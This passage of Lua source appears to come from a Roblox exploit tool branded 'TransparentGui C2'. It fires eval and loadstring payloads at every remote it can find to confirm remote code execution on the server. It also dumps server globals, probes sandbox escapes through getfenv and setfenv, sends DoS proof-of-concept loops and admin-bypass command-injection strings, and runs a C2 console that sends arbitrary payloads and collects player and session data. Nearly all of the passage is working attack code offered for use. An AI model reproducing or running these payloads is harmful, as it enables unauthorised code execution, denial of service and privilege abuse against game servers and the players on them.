                body   = tostring(res.Body or ""):sub(1,2048)
            end
        end
    end

    -- Method 3: http_request() -- fresh lookup each call
    local _hreq = _execFn("http_request")
    if not ok and _hreq then
        local rOk, res = pcall(_hreq, REQ_TBL)
        if rOk and type(res)=="table" then
            local sc = tonumber(res.StatusCode) or 0
            ok = sc>=200 and sc<300
            status = tostring(sc)
            body   = tostring(res.Body or ""):sub(1,2048)
        end
    end

    -- Method 4: HttpService:GetAsync (Studio only)
    if not ok then
        local rOk, res = pcall(function()
            return game:GetService("HttpService"):GetAsync(url)
        end)
        if rOk then
            ok=true; status="200"; body=tostring(res):sub(1,2048)
        else
            body = tostring(res):sub(1,200)
        end
    end

    local elapsed = math.floor((tick()-startT)*1000)

    table.insert(HTTP.feedHistory, {
        ts      = os.date("%H:%M:%S"),
        method  = "GET",
        url     = url:sub(1,48),
        status  = status,
        ms      = elapsed,
        response= body,
        payload = "",
    })
    if HTTP.treeRefresh then task.spawn(HTTP.treeRefresh) end
    return ok, status, body, elapsed
end


-- Collect all currently observable data into one structured payload
function HTTP:collect()
    local plr = game:GetService("Players").LocalPlayer
    local data = {
        meta = {
            tool      = "TransparentGui C2",
            timestamp = os.date("%Y-%m-%d %H:%M:%S"),
            placeId   = tostring(game.PlaceId),
            gameId    = tostring(game.GameId),
        },
        player = {
            name      = plr.Name,
            userId    = plr.UserId,
            accountAge= plr.AccountAge,
        },
        session = {
            packetsSent = c2PacketsSent,
            packetsRecv = c2PacketsRecv,
            target      = c2Target and c2Target.Name or "none",
        },
        remotes   = {},
        bindables = {},
        attributes= {},
    }
    -- Player attributes
    local ok, attrs = pcall(function() return plr:GetAttributes() end)
    if ok and attrs then
        for k, v in pairs(attrs) do data.attributes[k] = tostring(v) end
    end
    -- Discovered remotes
    local remotes = scanRemotes()
    for _, r in ipairs(remotes) do
        table.insert(data.remotes, { name=r.n, cls=r.cls, path=r.path })
    end
    local bindables = scanBindables()
    for _, b in ipairs(bindables) do
        table.insert(data.bindables, { name=b.n, cls=b.cls, path=b.path })
    end
    return data
end


-- ===============================================================================
-- RCE PROBE SYSTEM -- single table keeps us under Lua's 200-local limit
-- ===============================================================================
local RCE = {
    MAGIC_A    = 59483,
    MAGIC_B    = 20394,
    EXPECTED   = 79877,  -- 59483+20394, only reachable via dynamic evaluation
    sink       = nil,    -- confirmed execution sink Instance
    path       = "",     -- full path of confirmed sink
    active     = false,
    running    = false,
    lastClickT = 0,      -- double-click timer (absorbs a do-block local)
}

function RCE:containsMagic(val, depth)
    depth = depth or 0
    if depth > 4 then return false end
    local t = type(val)
    if t == "number"  then return math.floor(val) == RCE.EXPECTED end
    if t == "string"  then return val:find(tostring(RCE.EXPECTED)) ~= nil end
    if t == "table"   then
        for _, v in pairs(val) do
            if RCE:containsMagic(v, depth+1) then return true end
        end
    end
    return false
end

function RCE:probePayloads()
    local expr = "return "..RCE.MAGIC_A.."+"..RCE.MAGIC_B
    return {
        { id="RAW_STRING",  p = expr },
        { id="CODE_KEY",    p = { code=expr, eval=true } },
        { id="EXEC_KEY",    p = { exec=expr } },
        { id="ACTION_EVAL", p = { action="eval",       code=expr } },
        { id="ACTION_LOAD", p = { action="loadstring", code=expr } },
        { id="EXPR_FIELD",  p = { expr=RCE.MAGIC_A.."+"..RCE.MAGIC_B,
                                   evaluate=true, t=tick() } },
    }
end

function RCE:escalate(remote, isFn, onLog)
    onLog("Running escalation sequence...", Color3.fromRGB(218,155,40))
    local scopeProbes = {
        "return tostring(game.PlaceId)",
        { code="return tostring(game.PlaceId)", eval=true },
        { action="eval", code="return tostring(game.PlaceId)" },
    }
    if isFn then
        for _, p in ipairs(scopeProbes) do
            local ok, res = pcall(function() return remote:InvokeServer(p) end)
            if ok and res ~= nil then
                local rs = tostring(res)
                if #rs > 2 and rs:match("%d") then
                    onLog("  SCOPE LEAK: server -> "..rs:sub(1,40),
                        Color3.fromRGB(255,60,80))
                    break
                end
            end
        end
        -- Globals dump
        local gProbes = {
            "local t={} for k in pairs(_G) do t[#t+1]=k end return table.concat(t,',')",
            { code="local t={} for k in pairs(_G) do t[#t+1]=k end return table.concat(t,',')", eval=true },
        }
        for _, p in ipairs(gProbes) do
            local ok, res = pcall(function() return remote:InvokeServer(p) end)
            if ok and type(res)=="string" and #res>4 then
                onLog("  GLOBALS: "..res:sub(1,100), Color3.fromRGB(255,60,80))
                HTTP:capture("SERVER_RESPONSES","globals_"..os.date("%H%M%S"),
                    { globals=res, timestamp=os.date() })
                break
            end
        end
    end
    onLog("Escalation done. Script console routes through confirmed sink.",
        Color3.fromRGB(0,210,110))
end

function RCE:massProbe(onProgress, onComplete)
    if RCE.running then
        onProgress("Probe already running.", Color3.fromRGB(218,155,40))
        return
    end
    RCE.running = true

    onProgress("", nil)
    onProgress("+===================================+", Color3.fromRGB(255,60,80))
    onProgress("|   RCE MASS PROBE  INITIATED       |", Color3.fromRGB(255,60,80))
    onProgress("+===================================+", Color3.fromRGB(255,60,80))

    -- Gather all remotes
    local remotes = {}
    local roots = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        workspace,
    }
    for _, root in ipairs(roots) do
        local ok, descs = pcall(function() return root:GetDescendants() end)
        if ok then
            for _, inst in ipairs(descs) do
                if inst.ClassName=="RemoteFunction" or inst.ClassName=="RemoteEvent" then
                    table.insert(remotes, {
                        inst = inst,
                        path = instancePath(inst),
                        pri  = inst.ClassName=="RemoteFunction" and 0 or 1,
                    })
                end
            end
        end
    end
    table.sort(remotes, function(a, b)
        if a.pri ~= b.pri then return a.pri < b.pri end
        return a.path < b.path
    end)
    onProgress("Scanning "..#remotes.." remote(s) x 6 formats...",
        Color3.fromRGB(80,140,220))

    local found = false
    for _, rem in ipairs(remotes) do
        if RCE.active then break end
        local isFn = rem.inst.ClassName == "RemoteFunction"
        onProgress("Testing: "..rem.path:sub(1,52), Color3.fromRGB(55,60,80))

        for _, fmt in ipairs(RCE:probePayloads()) do
            if RCE.active then break end

            -- Attach callback listener for RemoteEvents
            local cbHit = false
            local cbConn
            if not isFn then
                local cOk, conn = pcall(function()
                    return rem.inst.OnClientEvent:Connect(function(...)
                        for _, a in ipairs({...}) do
                            if RCE:containsMagic(a) then cbHit=true end
                        end
                    end)
                end)
                if cOk then cbConn = conn end
            end

            -- Fire
            local rfReturn = nil
            if isFn then
                local ok, res = pcall(function()
                    return rem.inst:InvokeServer(fmt.p)
                end)
                if ok then rfReturn = res end
            else
                pcall(function() rem.inst:FireServer(fmt.p) end)
                task.wait(0.6)
            end
            if cbConn then pcall(function() cbConn:Disconnect() end) end

            local sinkHit = (rfReturn~=nil and RCE:containsMagic(rfReturn)) or cbHit
            if sinkHit then
                local evidence = rfReturn~=nil
                    and ("return="..tostring(rfReturn):sub(1,30))
                    or  "OnClientEvent callback"

                RCE.sink = rem.inst
                RCE.path   = rem.path
                RCE.active     = true
                found         = true

                onProgress("", nil)
                onProgress("+======================================+", Color3.fromRGB(255,60,80))
                onProgress("|  [OK]  RCE CONFIRMED                    |", Color3.fromRGB(255,60,80))
                onProgress("|  Sink:    "..rem.path:sub(1,28),         Color3.fromRGB(255,60,80))
                onProgress("|  Format:  "..fmt.id,                     Color3.fromRGB(255,60,80))
                onProgress("|  Evidence:"..evidence:sub(1,28),         Color3.fromRGB(255,60,80))
                onProgress("+======================================+", Color3.fromRGB(255,60,80))

                HTTP:capture("SERVER_RESPONSES","rce_confirmed_"..os.date("%H%M%S"),{
                    verdict=true, remote=rem.path,
                    format=fmt.id, evidence=evidence,
                    timestamp=os.date(),
                })
                RCE:escalate(rem.inst, isFn, onProgress)
                break
            end
            task.wait(0.05)
        end
    end

    RCE.running = false
    if not found then
        onProgress("", nil)
        onProgress("=== PROBE COMPLETE -- NO SINKS FOUND ===", Color3.fromRGB(55,60,80))
        onProgress("All "..#remotes.." remotes tested. Server uses hardcoded handlers.",
            Color3.fromRGB(55,60,80))
    end
    if onComplete then onComplete(found) end
end

-- Execute code through the confirmed sink
function RCE:exec(code, onResult)
    if not RCE.active or not RCE.sink then
        onResult(false,"No confirmed sink. Run PROBE ALL first.")
        return
    end
    local isFn = RCE.sink.ClassName == "RemoteFunction"
    local payloads = {
        code,
        { code=code, eval=true },
        { action="eval", code=code },
        { exec=code },
    }
    for _, p in ipairs(payloads) do
        if isFn then
            local ok, res = pcall(function() return RCE.sink:InvokeServer(p) end)
            if ok then
                onResult(true, res~=nil and tostring(res):sub(1,200) or "(nil)")
                return
            end
        else
            local ok = pcall(function() RCE.sink:FireServer(p) end)
            if ok then onResult(true,"Fired -- watch terminal for callbacks.") return end
        end
    end
    onResult(false,"All payload formats rejected.")
end


-- ===============================================================================
-- VM / INTERPRETER PROBE SYSTEM
-- Targets: Lua-in-Lua VMs (vIu, FIOne, Yueliang), rigid command parsers,
--          and any remote that accepts string payloads for dynamic evaluation.
-- ===============================================================================

-- Name signatures that suggest a VM, interpreter, or command system
RCE.VM_NAME_SIGS = {
    "exec","run","eval","script","code","vm","interpret","command","cmd",
    "console","admin","execute","lua","fiOne","viu","yueliang","sandbox",
    "compiler","runner","shell","terminal","repl","loadstring","invoke",
}

-- Staged probe payloads for Lua-in-Lua VM detection
RCE.VM_STAGE_CONFIRM = {
    -- If ANY of these returns "X_79877", execution is confirmed
    "return 'X_'..(59483+20394)",
    "return tostring(59483+20394)",
    "print(59483+20394)",
    { code  = "return 'X_'..(59483+20394)" },
    { exec  = "return 'X_'..(59483+20394)" },
    { script= "return 'X_'..(59483+20394)", run=true },
}

RCE.VM_STAGE_BOUNDARY = {
    -- Maps what the sandbox exposes. Returns tell us escape surface.
    { q="return type(game)",       key="game"       },
    { q="return type(workspace)",  key="workspace"  },
    { q="return type(loadstring)", key="loadstring" },
    { q="return type(getfenv)",    key="getfenv"    },
    { q="return type(debug)",      key="debug"      },
    { q="return type(require)",    key="require"    },
    { q="return type(script)",     key="script"     },
}

RCE.VM_STAGE_ESCAPE = {
    -- Metatable climb via string library (works if string methods are exposed)
    { id="STRING_MT",
      q="local s='' local m=getmetatable(s) if m then return type(m.__index) end return 'none'" },
    -- Steal env from a known native function
    { id="GETFENV_NATIVE",
      q="local ok,r=pcall(getfenv,string.rep) if ok then return tostring(r.game) end return 'blocked'" },
    -- rawget through the environment table
    { id="RAWGET_ENV",
      q="return tostring(rawget(getfenv(0),'game'))" },
    -- If a real Roblox object is passed into the sandbox, climb via it
    { id="OBJ_PASSTHROUGH",
      q="if game then return 'FULL_ACCESS:'..tostring(game.PlaceId) end return 'sandboxed'" },
    -- setfenv injection -- if we can replace a function's env
    { id="SETFENV_INJECT",
      q="local f=function() return game end pcall(setfenv,f,getfenv(0)) local ok,r=pcall(f) return tostring(r)" },
}

RCE.VM_STAGE_EXECUTE = {
    -- Post-escape payloads -- only sent if escape confirmed
    "return tostring(game.PlaceId)",
    "return game:GetService('Players'):GetPlayers()[1].Name",
    "return tostring(#game:GetService('Players'):GetPlayers())..' players online'",
}

RCE.VM_DOS_POC = {
    -- Controlled stress tests -- prove DoS without crashing
    { id="LOOP_POC",
      q="local n=0 for i=1,50000 do n=n+i end return 'LOOP_OK:'..n" },
    { id="MEM_POC",
      q="local t={} for i=1,500 do t[i]=('X'):rep(1024) end return 'MEM_OK:'..#t" },
    { id="STRING_POC",
      q="local s='' for i=1,200 do s=s..('A'):rep(256) end return 'STR_OK:'..#s" },
}

RCE.CMD_INJECT_PATTERNS = {
    -- Command parser injection -- tries to chain execution
    ":exec return 59483+20394",
    ":run return 59483+20394",
    ":eval 59483+20394",
    ":lua return 59483+20394",
    "/exec return 59483+20394",
    "exec return 59483+20394",
    -- Separator injection
    "speed me 100|exec return 59483+20394",
    "speed me 100;return 59483+20394",
    "speed\nreturn 59483+20394",
    -- Admin/rank bypass
    ":admin "..tostring(game:GetService("Players").LocalPlayer.Name),
    ":god " ..tostring(game:GetService("Players").LocalPlayer.Name),
    ":owner "..tostring(game:GetService("Players").LocalPlayer.Name),
    -- Parameter overflow/confusion
    "speed me 2147483647",
    "jump me 2147483647",
    "health me 2147483647",
}

-- Determine if a remote name suggests a VM or command system
function RCE:vmMatchesSig(name)
    local lower = name:lower()
    for _, sig in ipairs(RCE.VM_NAME_SIGS) do
        if lower:find(sig, 1, true) then return true, sig end
    end
    return false, nil
end

-- Check if a response value confirms VM execution
function RCE:vmConfirmsExec(val)
    if val == nil then return false end
    local s = tostring(val)
    return s:find("X_79877") ~= nil
        or s:find("79877") ~= nil
        or RCE:containsMagic(val)
end

-- Fire a payload to a remote and get the response
function RCE:vmFire(remote, payload, timeout)
    timeout = timeout or 1.0
    local isFn = remote.ClassName == "RemoteFunction"
    local cbHit = nil
    local cbConn

    if not isFn then
        local ok, conn = pcall(function()
            return remote.OnClientEvent:Connect(function(...)
                local args = {...}
                if cbHit == nil then
                    cbHit = #args > 0 and tostring(args[1]) or "(fired)"
                end
            end)
        end)
        if ok then cbConn = conn end
    end

    local rfReturn = nil
    if isFn then
        local ok, res = pcall(function() return remote:InvokeServer(payload) end)
        if ok then rfReturn = res end
    else
        pcall(function() remote:FireServer(payload) end)
    end

    task.wait(timeout)
    if cbConn then pcall(function() cbConn:Disconnect() end) end
    return rfReturn, cbHit
end

-- Stage 1: Confirm VM execution
function RCE:vmProbeConfirm(remote, path, onLog)
    for _, p in ipairs(RCE.VM_STAGE_CONFIRM) do
        local ret, cb = RCE:vmFire(remote, p, 0.8)
        local confirmed = RCE:vmConfirmsExec(ret) or RCE:vmConfirmsExec(cb)
        if confirmed then
            onLog("  [OK] EXEC CONFIRMED via "..(type(p)=="string" and p:sub(1,32) or "table"),
                Color3.fromRGB(255,60,80))
            return true, ret or cb
        end
    end
    return false, nil
end

-- Stage 2: Map sandbox boundary
function RCE:vmProbeBoundary(remote, path, onLog)
    local boundary = {}
    for _, probe in ipairs(RCE.VM_STAGE_BOUNDARY) do
        local ret = RCE:vmFire(remote, probe.q, 0.5)
        local accessible = (ret ~= nil and tostring(ret) ~= "nil")
        boundary[probe.key] = accessible
            and { accessible=true, type=tostring(ret) }
            or  { accessible=false }
        if accessible then
            onLog("  ! EXPOSED: "..probe.key.." -> "..tostring(ret):sub(1,30),
                Color3.fromRGB(218,155,40))
        else
            onLog("  . sandboxed: "..probe.key, Color3.fromRGB(55,60,80))
        end
        task.wait(0.1)
    end
    return boundary
end

-- Stage 3: Attempt sandbox escape
function RCE:vmProbeEscape(remote, path, boundary, onLog)
    -- Only attempt if something useful is exposed
    local hasGetfenv = boundary.getfenv and boundary.getfenv.accessible
    local hasDebug   = boundary.debug   and boundary.debug.accessible

    for _, vec in ipairs(RCE.VM_STAGE_ESCAPE) do
        local ret = RCE:vmFire(remote, vec.q, 0.8)
        if ret ~= nil then
            local rs = tostring(ret)
            if rs:find("FULL_ACCESS") or rs:find("userdata") or rs:find("%d%d%d%d") then
                onLog("  [OK] ESCAPE via "..vec.id..": "..rs:sub(1,50),
                    Color3.fromRGB(255,60,80))
                return true, vec.id, rs
            else
                onLog("  . "..vec.id..": "..rs:sub(1,30), Color3.fromRGB(55,60,80))
            end
        end
        task.wait(0.1)
    end
    return false, nil, nil
end

-- Stage 4 + 5: Post-escape + DoS PoC
function RCE:vmProbePost(remote, path, escaped, onLog)
    if escaped then
        onLog("  Running post-escape commands...", Color3.fromRGB(218,155,40))
        for _, payload in ipairs(RCE.VM_STAGE_EXECUTE) do
            local ret = RCE:vmFire(remote, payload, 1.0)
            if ret ~= nil then
                onLog("  SERVER-> "..tostring(ret):sub(1,60), Color3.fromRGB(255,60,80))
                HTTP:capture("SERVER_RESPONSES","vm_exec_"..os.date("%H%M%S"),
                    { payload=payload, result=tostring(ret), path=path })
            end
            task.wait(0.2)
        end
    end

    -- DoS PoC (always runs -- proves vulnerability regardless of escape)
    onLog("  Running DoS proof-of-concept...", Color3.fromRGB(218,155,40))
    for _, poc in ipairs(RCE.VM_DOS_POC) do
        local t0  = tick()
        local ret = RCE:vmFire(remote, poc.q, 3.0)
        local ms  = math.floor((tick()-t0)*1000)
        if ret ~= nil then
            onLog("  DoS/"..poc.id..": "..tostring(ret):sub(1,40)
                .." ("..ms.."ms)", Color3.fromRGB(218,155,40))
        else
            onLog("  DoS/"..poc.id..": timeout @ "..ms.."ms -- possible freeze vector",
                Color3.fromRGB(255,60,80))
        end
        task.wait(0.2)
    end
end

-- Full staged VM probe
function RCE:probeVM(remote, path, onLog)
    onLog("+- VM PROBE: "..path:sub(1,48), Color3.fromRGB(0,210,200))

    -- Stage 1
    local execOk, evidence = RCE:vmProbeConfirm(remote, path, onLog)
    if not execOk then
        onLog("+- No execution confirmed -- skipping.", Color3.fromRGB(55,60,80))
        return false
    end

    -- Stage 2
    onLog("+- Mapping sandbox boundary...", Color3.fromRGB(218,155,40))
    local boundary = RCE:vmProbeBoundary(remote, path, onLog)

    -- Stage 3
    onLog("+- Attempting sandbox escape...", Color3.fromRGB(218,155,40))
    local escaped, escapeVec, escapeEvidence = RCE:vmProbeEscape(remote, path, boundary, onLog)

    if escaped then
        RCE.sink   = remote
        RCE.path   = path
        RCE.active = true
        onLog("+- SANDBOX ESCAPED via "..tostring(escapeVec), Color3.fromRGB(255,60,80))
        HTTP:capture("SERVER_RESPONSES","vm_escaped_"..os.date("%H%M%S"), {
            path=path, escape_vector=escapeVec, evidence=escapeEvidence,
            boundary=boundary, timestamp=os.date()
        })
    else
        onLog("+- Sandbox held -- no escape confirmed.", Color3.fromRGB(55,60,80))
    end

    -- Stage 4+5
    RCE:vmProbePost(remote, path, escaped, onLog)

    onLog("+- VM probe complete.", Color3.fromRGB(0,210,200))
    return true
end

-- Probe a remote as a command parser
function RCE:probeParser(remote, path, onLog)
    onLog("+- CMD PARSER PROBE: "..path:sub(1,44), Color3.fromRGB(160,80,255))
    local hits = {}

    for _, pattern in ipairs(RCE.CMD_INJECT_PATTERNS) do
        local ret, cb = RCE:vmFire(remote, pattern, 0.6)
        local rs = tostring(ret or cb or "")
        if RCE:vmConfirmsExec(ret) or RCE:vmConfirmsExec(cb) then
            onLog("  [OK] INJECTION via: "..pattern:sub(1,40), Color3.fromRGB(255,60,80))
            table.insert(hits, pattern)
        elseif rs ~= "" and rs ~= "nil" and #rs > 1 then
            onLog("  . Response: "..rs:sub(1,50), Color3.fromRGB(218,155,40))
        end
        task.wait(0.08)
    end

    if #hits > 0 then
        onLog("+- PARSER INJECTION CONFIRMED: "..#hits.." vector(s)", Color3.fromRGB(255,60,80))
        HTTP:capture("SERVER_RESPONSES","parser_injection_"..os.date("%H%M%S"),{
            path=path, hits=hits, timestamp=os.date()
        })
    else
        onLog("+- Parser appears safe -- no injection vectors found.", Color3.fromRGB(55,60,80))
    end
    return #hits > 0
end

-- Discover VM/interpreter/parser remotes by signature + behavior
function RCE:discoverAndProbeVMs(onProgress, onComplete)
    if RCE.running then
        onProgress("Scan already running.", Color3.fromRGB(218,155,40))
        return
    end
    RCE.running = true

    onProgress("", nil)
    onProgress("+========================================+", Color3.fromRGB(0,210,200))
    onProgress("|  VM / INTERPRETER SCAN  INITIATED      |", Color3.fromRGB(0,210,200))
    onProgress("+========================================+", Color3.fromRGB(0,210,200))

    local roots = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        workspace,
    }
    local candidates = {}
    for _, root in ipairs(roots) do
        local ok, descs = pcall(function() return root:GetDescendants() end)
        if ok then
            for _, inst in ipairs(descs) do
                if inst.ClassName=="RemoteFunction" or inst.ClassName=="RemoteEvent" then
                    local matched, sig = RCE:vmMatchesSig(inst.Name)
                    if matched then
                        table.insert(candidates, {
                            inst = inst,
                            path = instancePath(inst),
                            sig  = sig,
                            pri  = inst.ClassName=="RemoteFunction" and 0 or 1,
                        })
                    end
                end
            end
        end
    end

    table.sort(candidates, function(a, b)
        if a.pri ~= b.pri then return a.pri < b.pri end
        return a.path < b.path
    end)

    onProgress("Found "..#candidates.." candidate(s) matching VM/parser signatures.",
        Color3.fromRGB(0,210,200))

    if #candidates == 0 then
        onProgress("No signature matches. Try PROBE ALL for broader coverage.",
            Color3.fromRGB(55,60,80))
        RCE.running = false
        if onComplete then onComplete(false) end
        return
    end

    local vmHits     = 0
    local parserHits = 0

    for _, cand in ipairs(candidates) do
        onProgress("Sig ["..cand.sig.."] -> "..cand.path:sub(1,50),
            Color3.fromRGB(80,140,220))

        -- Try VM probe first
        local isVM = RCE:probeVM(cand.inst, cand.path, onProgress)
        if isVM then
            vmHits = vmHits + 1
        else
            -- Try as command parser
            local isParser = RCE:probeParser(cand.inst, cand.path, onProgress)
            if isParser then parserHits = parserHits + 1 end
        end

        task.wait(0.15)
    end

    onProgress("", nil)
    onProgress("=== VM SCAN COMPLETE ===", Color3.fromRGB(0,210,200))
    onProgress("VM/interpreter hits: "..vmHits.."  |  Parser hits: "..parserHits,
        Color3.fromRGB(0,210,200))

    RCE.running = false
    if onComplete then onComplete(vmHits > 0 or parserHits > 0) end
end

-- --- C2 CONTROL SURFACE ------------------------------------------------------
-- Module-level state (persists across tab switches)
local c2Status       = "OFFLINE"
local c2Target       = nil
local c2Listeners    = {}
local c2PacketsSent  = 0
local c2PacketsRecv  = 0
local c2SessionStart = nil
local c2LastContact  = nil
local c2TimerActive  = false

-- UI references (set during buildC2Page, used by c2Log / c2UpdateStatus)
local c2StatusDot  = nil
local c2StatusLbl  = nil
local c2TargetLbl  = nil
local c2SentLbl    = nil
local c2RecvLbl    = nil
local c2TimeLbl    = nil
local c2ContactLbl = nil
local c2LogScroll  = nil
local c2LogLines   = {}
local MAX_C2_LOG   = 200
local C2_LINE_H    = 15

local C2_COL = {
    OFFLINE    = Color3.fromRGB( 80,  85, 100),
    CONNECTING = Color3.fromRGB(218, 160,  48),
    ACTIVE     = Color3.fromRGB( 88, 200, 128),
    LOST       = Color3.fromRGB(218,  60,  68),
    OUT        = Color3.fromRGB( 80, 160, 220),
    IN         = Color3.fromRGB( 88, 200, 128),
    SYS        = Color3.fromRGB( 90, 100, 130),
    ERR        = Color3.fromRGB(218,  60,  68),
    INFO       = Color3.fromRGB(218, 160,  48),
}

-- -- Append a line to the terminal --------------------------------------------
local function c2Log(tag, msg, col)
    if not c2LogScroll then return end
    col = col or C2_COL.SYS
    local ts   = os.date("%H:%M:%S")
    local line = string.format("[%s] %-11s %s", ts, tag, msg)

    local lbl = Instance.new("TextLabel")
    lbl.Size                  = UDim2.new(1,-8,0,C2_LINE_H)
    lbl.BackgroundTransparency= 1
    lbl.Text                  = line
    lbl.Font                  = Enum.Font.Code
    lbl.TextSize              = 9
    lbl.TextColor3            = col
    lbl.TextXAlignment        = Enum.TextXAlignment.Left
    lbl.TextYAlignment        = Enum.TextYAlignment.Center
    lbl.TextTruncate          = Enum.TextTruncate.AtEnd
    lbl.ZIndex                = 12
    lbl.Parent                = c2LogScroll

    table.insert(c2LogLines, lbl)

    -- Reposition all lines
    for i, l in ipairs(c2LogLines) do
        l.Position = UDim2.fromOffset(4, (i-1)*C2_LINE_H)
    end

    -- Cap log length
    if #c2LogLines > MAX_C2_LOG then
        c2LogLines[1]:Destroy()
        table.remove(c2LogLines, 1)
        for i, l in ipairs(c2LogLines) do
            l.Position = UDim2.fromOffset(4, (i-1)*C2_LINE_H)
        end
    end

    local totalH = #c2LogLines * C2_LINE_H
    c2LogScroll.CanvasSize     = UDim2.fromOffset(0, totalH)
    c2LogScroll.CanvasPosition = Vector2.new(0,
        math.max(0, totalH - c2LogScroll.AbsoluteSize.Y))
end

-- -- Update status indicator ---------------------------------------------------
local function c2UpdateStatus(status)
    c2Status = status
    local col = C2_COL[status] or C2_COL.OFFLINE
    if c2StatusLbl then
        c2StatusLbl.Text       = status
        c2StatusLbl.TextColor3 = col
    end
    if c2StatusDot then
        c2StatusDot.BackgroundColor3 = col
        c2StatusDot.BackgroundTransparency = 0.0
        if status == "CONNECTING" then
            task.spawn(function()
                while c2Status == "CONNECTING" do
                    TweenService:Create(c2StatusDot,
                        TweenInfo.new(0.45),{BackgroundTransparency=0.65}):Play()
                    task.wait(0.45)
                    if c2Status ~= "CONNECTING" then break end
                    TweenService:Create(c2StatusDot,
                        TweenInfo.new(0.45),{BackgroundTransparency=0.0}):Play()
                    task.wait(0.45)
                end
            end)
        end
    end
end

-- -- Update session stat labels ------------------------------------------------
local function c2UpdateStats()
    if c2SentLbl    then c2SentLbl.Text    = tostring(c2PacketsSent) end
    if c2RecvLbl    then c2RecvLbl.Text    = tostring(c2PacketsRecv) end
    if c2SessionStart and c2TimeLbl then
        local e = math.floor(tick()-c2SessionStart)
        c2TimeLbl.Text = string.format("%02d:%02d", math.floor(e/60), e%60)
    end
    if c2LastContact and c2ContactLbl then
        local ago = math.floor(tick()-c2LastContact)
        c2ContactLbl.Text = ago .. "s ago"
        if ago > 15 and c2Status == "ACTIVE" then
            c2UpdateStatus("LOST")
            c2Log("SYS", "Connection lost -- no server signal for "..ago.."s.", C2_COL.ERR)
        end
    end
end

-- -- Disconnect ----------------------------------------------------------------
local function c2Disconnect()
    for _, conn in ipairs(c2Listeners) do
        pcall(function() conn:Disconnect() end)
    end
    c2Listeners   = {}
    c2TimerActive = false
    c2Target      = nil
    c2UpdateStatus("OFFLINE")
    if c2TargetLbl  then c2TargetLbl.Text  = "none" end
    if c2SentLbl    then c2SentLbl.Text    = "--" end
    if c2RecvLbl    then c2RecvLbl.Text    = "--" end
    if c2TimeLbl    then c2TimeLbl.Text    = "--" end
    if c2ContactLbl then c2ContactLbl.Text = "--" end
    c2Log("SYS", "Disconnected -- all listeners removed.", C2_COL.SYS)
end

-- -- Connect -------------------------------------------------------------------
local function c2Connect()
    local node, inst = resolveTarget()
    if not node then
        c2Log("!",
            "No remote configured. Set up a Remote or Ingress node first.",
            C2_COL.ERR)
        return
    end
    if not inst then
        c2Log("!",
            "Node has no live instance. Right-click the Remote node to select one.",
            C2_COL.ERR)
        return
    end

    if #c2Listeners > 0 then c2Disconnect() end

    c2Target       = inst
    c2PacketsSent  = 0
    c2PacketsRecv  = 0
    c2SessionStart = tick()
    c2LastContact  = nil

    if c2TargetLbl then c2TargetLbl.Text = inst.Name end
    c2UpdateStatus("CONNECTING")
    c2Log("SYS", "Session opened -- target: "
        .. inst.ClassName .. " @ " .. instancePath(inst), C2_COL.SYS)
    c2Log("SYS", "Scanning for RemoteEvents to attach listeners...", C2_COL.SYS)

    -- Attach listeners to ALL visible RemoteEvents
    local scanRoots = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ReplicatedFirst"),
        workspace,
    }
    local attached = 0
    for _, root in ipairs(scanRoots) do
        local ok, descs = pcall(function() return root:GetDescendants() end)
        if ok then
            for _, rem in ipairs(descs) do
                if rem.ClassName == "RemoteEvent" then
                    local remName = rem.Name
                    local remPath = instancePath(rem)
                    local ok2, conn = pcall(function()
                        return rem.OnClientEvent:Connect(function(...)
                            local args = {...}
                            c2PacketsRecv = c2PacketsRecv + 1
                            c2LastContact = tick()

                            -- First response: upgrade to ACTIVE
                            if c2Status ~= "ACTIVE" then
                                c2UpdateStatus("ACTIVE")
                                c2Log("SYS",
                                    "Server responding -- connection ACTIVE.",
                                    C2_COL.ACTIVE)
                            end

                            -- Format response args
                            local parts = {}
                            for _, a in ipairs(args) do
                                if type(a) == "table" then
                                    local jOk, j = pcall(function()
                                        return game:GetService("HttpService"):JSONEncode(a)
                                    end)
                                    table.insert(parts, jOk and j:sub(1,48) or "table{}")
                                else
                                    table.insert(parts, tostring(a):sub(1,48))
                                end
                            end
                            local resp = #parts>0
                                and table.concat(parts, "  |  ")
                                or "(no args)"

                            c2Log("[<-] "..remName, resp, C2_COL.IN)
                            c2UpdateStats()
                        end)
                    end)
                    if ok2 then
                        table.insert(c2Listeners, conn)
                        attached = attached + 1
                    end
                end
            end
        end
    end

    c2Log("SYS", "Listeners attached to "..attached.." RemoteEvent(s).", C2_COL.SYS)
    c2Log("SYS", "Waiting for server signal...", C2_COL.SYS)

    -- Session timer
    c2TimerActive = true
    task.spawn(function()
        while c2TimerActive and #c2Listeners > 0 do
            c2UpdateStats()
            task.wait(1)
        end
    end)
end

-- -- Send a command ------------------------------------------------------------
local function c2Send(label, payload)
    if not c2Target then
        c2Log("!", "Not connected. Press CONNECT first.", C2_COL.ERR)
        return
    end

    -- Inject session fields
    if type(payload) == "table" then
        payload.t      = tick()
        payload.userId = game:GetService("Players").LocalPlayer.UserId
    end

    -- Log outbound
    local payStr
    if type(payload) == "table" then
        local jOk, j = pcall(function()
            return game:GetService("HttpService"):JSONEncode(payload)
        end)
        payStr = jOk and j:sub(1,64) or "table{}"
    else
        payStr = tostring(payload):sub(1,64)
    end
    c2Log("[->] "..label, payStr, C2_COL.OUT)

    local ok, result = pcall(function()
        if c2Target.ClassName == "RemoteEvent" then
            c2Target:FireServer(payload)
            return nil
        elseif c2Target.ClassName == "RemoteFunction" then
            return c2Target:InvokeServer(payload)
        end
    end)

    c2PacketsSent = c2PacketsSent + 1

    if not ok then
        c2Log("!", "Server error: "..tostring(result):sub(1,72), C2_COL.ERR)
    elseif result ~= nil then
        -- RemoteFunction returned immediately -- log it
        local resStr
        if type(result) == "table" then
            local jOk, j = pcall(function()
                return game:GetService("HttpService"):JSONEncode(result)
            end)
            resStr = jOk and j:sub(1,72) or "table{}"
        else
            resStr = tostring(result):sub(1,72)
        end
        c2PacketsRecv = c2PacketsRecv + 1
        c2LastContact = tick()
        if c2Status ~= "ACTIVE" then c2UpdateStatus("ACTIVE") end
        c2Log("[<-] RETURN", resStr, C2_COL.IN)
    end

    c2UpdateStats()
end

-- -- C2 state table (presets + categories in one local to save variable slot) --
local C2 = {}
C2.presets = {
    { label="PING",        col=C2_COL.SYS,
      payload={ action="ping" } },
    { label="STATUS",      col=C2_COL.SYS,
      payload={ action="getStatus" } },
